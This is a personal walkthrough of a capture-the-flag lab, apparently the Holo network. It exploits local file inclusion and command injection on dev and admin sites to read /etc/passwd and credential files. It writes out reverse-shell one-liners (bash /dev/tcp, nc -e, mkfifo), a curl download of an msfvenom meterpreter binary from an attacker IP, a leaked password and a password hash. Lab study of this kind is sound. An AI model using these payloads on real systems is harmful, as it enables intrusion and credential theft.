This just to practice so that we can get use to the file structure and all the stuff.

We have to change the port from by-default 80 to 8081 as our Burp Suite runs on port 8080
```
nano /etc/apache2/ports.conf
```
![[Pasted image 20231005210248.png]]


We have to either download the files in the /www/html folder or have to move there.
```
http://localhost:8080/index.php
```
![[Pasted image 20231005211852.png]]
![[Pasted image 20231005211907.png]]


Let's now understand what's going on and Practice some attacks ?__?

We have two attacks mentioned in the above photo:
LFI : local file inclusion

So what is LFI ??
Remote File Inclusion (RFI): The file is loaded from a remote server (Best: You can write the code and the server will execute it). In php this is disabled by default (allow_url_include).
Local File Inclusion (LFI): The sever loads a local file.
https://book.hacktricks.xyz/pentesting-web/file-inclusion
http://localhost:8080/lfi.php?file=catpics.jpg../../../../../../../../etc/passwd
We have seen something like this earlier when i open the link in a new tab for the development site

Practice Time !_!
```
http://localhost:8080/lfi.php?file=catpics.jpg
```
![[Pasted image 20240204115344.png]]
To exploit this vulnerability we need to utilize a technique called directory bursting aka file path traversal.


```
http://localhost:8080/lfi.php?file=../../../../etc/passwd
```
![[Pasted image 20240204120201.png]]


So you u recall it correctly 
http://dev.holo.live/img.php?file=images/fubuki.jpg
![[Pasted image 20231007174112.png]]
Let's see if it's vulnerable or not
Yup so my intuition was righttttttttttttttttt
So let's run the directory bursting and see if we could catch something juicy


Let's test the 1st vulnerability which is the LFI in that will talk about directory traversing
```
http://localhost:8080/lfi.php?file=catpics.jpg../../../../../../../../etc/passwd
```
i have tried with 4 and than 8 and it worked
![[Pasted image 20231005235752.png]]


So i have a file and this is what worked for me as i got a file with it
We have the file list that is allowed and things that are not allowed

```
gobuster dir -u http://admin.holo.live/ -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/big.txt -t 30
```
![[Pasted image 20240204124028.png]]

```
http://admin.holo.live/robots.txt
```
![[Pasted image 20240204124112.png]]


```
http://dev.holo.live/img.php?file=../../../../../../var/www/admin/supersecretdir/creds.txt
```
or 
```
http://dev.holo.live/img.php?file=images/fubuki.jpg../../../../../../var/www/admin/supersecretdir/creds.txt
```

This is just for try
```
../var/www/admin/supersecretdir/creds.txt
../../var/www/admin/supersecretdir/creds.txt
../../../var/www/admin/supersecretdir/creds.txt
../../../../var/www/admin/supersecretdir/creds.txt
../../../../../var/www/admin/supersecretdir/creds.txt
../../../../../../var/www/admin/supersecretdir/creds.txt
```

Data we got
```
I know you forget things, so I'm leaving this note for you:
admin:DBManagerLogin!
- gurag <3
- 
```
![[Pasted image 20231007183518.png]]


2nd Vulnerability 
RCE:
remote code execution
https://www.imperva.com/learn/application-security/remote-code-execution/
Hello www-data!

We have a file in admin domain that we were not able to access
![[Pasted image 20231007182112.png]]
Let's try to run it from the dev site and see if we can read it using the LFI vulnerability
```
/var/www/admin/supersecretdir/creds.txt
```


In the practice section we can read the data easily
```
http://localhost:8080/rce.php?cmd=ls+-la%20&&%20echo%20%22%22
```
```
Hello drwxr-xr-x 2 root root 4096 Nov 11 2020 secretdir
```
![[Pasted image 20240204124629.png]]


Let's see how we can exploit it in the admin site
1st will login in to the website and than will attempt to find the RCE vulnerability
![[Pasted image 20231007184745.png]]

```
http://admin.holo.live/dashboard.php?cmd=cat%20/etc/passwd%22%22

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false 
```

Keep in mind that we have many parameter we can use to gather information
![[Pasted image 20231007185003.png]]

```
http://admin.holo.live/dashboard.php?cmd=ls+-la%20&&%20echo%20%22%22
press ctrl + u
drwxr-xr-x 6 root root  4096 Jan 16  2021 .
drwxr-xr-x 1 root root  4096 Jan 16  2021 ..
-rw-r--r-- 1 root root    69 Jan  4  2021 .htaccess
-rw-r--r-- 1 root root  1619 Nov  3  2020 action_page.php
drwxr-xr-x 7 root root  4096 Jul  4  2019 assets
-rw-r--r-- 1 root root 16120 Nov  3  2020 dashboard.php
-rw-r--r-- 1 root root   348 Nov  3  2020 db_connect.php
drwxr-xr-x 2 root root  4096 Jul  4  2019 docs
drwxr-xr-x 2 root root  4096 Oct 23  2020 examples
-rwxr-xr-x 1 root root 11753 Oct 22  2020 hololive.png
-rw-r--r-- 1 root root  1845 Oct 22  2020 index.php
-rw-r--r-- 1 root root   135 Jan 16  2021 robots.txt
drwxr-xr-x 2 root root  4096 Jan  4  2021 supersecretdir
```
![[Pasted image 20231007185415.png]]
Let's peak in what's in super secret dir
```
http://admin.holo.live/dashboard.php?cmd=ls%20-la%20supersecretdir%22%22
```
![[Pasted image 20231007192831.png]]
We got a file named creds.txt let's see if we can read it or not
```
I know you forget things, so I'm leaving this note for you: admin:DBManagerLogin! - gurag <3 Visitors today 
```
So it's not useful for us


Let's see what we are not allowed to access so that we can perform the LFI 
![[Pasted image 20231007193129.png]]
```
http://dev.holo.live/img.php?file=../../../../../../var/www/admin/dashboard.php
```
We got something but not sure what at this point of time
```
There is somedata being leaked or it's mis-configured but it looks juicyyyyy
 
 <?php 
 if ($_GET['cmd'] === NULL) 
	{ echo passthru("cat /tmp/Views.txt"); } 
 else 
	 { echo passthru($_GET['cmd']);}
?> Visitors today</h4>

<!--//if ($_GET['cmd'] === NULL) { echo passthru("cat /tmp/Views.txt"); } else { echo passthru($_GET['cmd']);} -->
                
```
![[Pasted image 20231007193526.png]]
![[Pasted image 20231007193650.png]]
![[Pasted image 20231007193714.png]]
```
Let's read the file
cat /tmp/Views.txt

```


Now i will enumerate a little so will get a idea which level of user we are
```
?cmd=whoami
www-data 
?cmd=hostname
80d6348b223e
?cmd=uname -a
Linux 80d6348b223e 5.4.0-1030-aws #31-Ubuntu SMP Fri Nov 13 11:40:37 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
?cmd=which bash
/bin/bash 
```

Let's try to get a reverse shell from bash -> python3 -> php

Will setup a netcat listner
```
http://admin.holo.live/dashboard.php?cmd=bash -i >& /dev/tcp/10.8.167.78/4444 0>&1 it didn't worked let's try to run 

Payload
?cmd=nc -e /bin/sh 10.8.167.78 4444
http://admin.holo.live/dashboard.php?cmd=nc -e /bin/sh 10.8.167.78 4444

admin.holo.live/dashboard.php?cmd=nc%20-e%20/bin/sh%2010.8.167.78%204444

admin.holo.live/dashboard.php?cmd=nc+-e+/bin/sh+10.8.167.78+4444
```

Will try to upload the reverse shell simply in the tmp folder and will trigger it from there.
I am not getting the reverse shell will use 

msfvenom to make a reverse shell meterpter shell and will use msfconsole to get the shell

Will look into the tmp folder
```
admin.holo.live/dashboard.php?cmd=ls -la /tmp
```
![[Pasted image 20231011215133.png]]

Will upload the file here by using wget and python3 server

Payload
```
msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o mt LHOST=10.8.167.78 LPORT=4444
```
![[Pasted image 20231011225055.png]]

msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o mt LHOST=10.8.167.78 LPORT=4444

curl http://10.8.167.78:8001/mt -o /tmp/mt

Now will set the payload in the msf console via the multi handler
![[Pasted image 20231014132831.png]]
https://www.youtube.com/watch?v=a3IQ8IuVLmM



```
curl http://10.8.167.78:8000/mt -o /tmp/mt

/bin/nc -e /bin/sh 10.8.167.78 4444

Nettech India

DBManagerLogin!
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.167.78 4444 >/tmp/f


#Holo
10.200.107.33    holo.live
10.200.107.33    www.holo.live
10.200.107.33    admin.holo.live
10.200.107.33    dev.holo.live

```

```
/bin/nc -e /bin/sh 10.50.103.169 4444
10.50.103.169
```


Got the shell finally and stabilize it from Dumb to interactive shell
![[Pasted image 20231017234139.png]]



```
INSERT INTO `wp_users` VALUES (1,'admin','$P$BNIIemIQlkZoVqK/XIqOlcpNToFoIu0','admin','ad


www-data@2609cd947c48:/tmp$ cat dbScript.sh 
#!/bin/bash
mysql -u root -f < /tmp/db.dump

www-data@2609cd947c48:/tmp$ cat Views.txt 
83

```

Got the First Flag
```
www-data@2609cd947c48:/var/www$ cat user.txt 
HOLO{175d7322f8fc53392a417ccde356c3fe}
```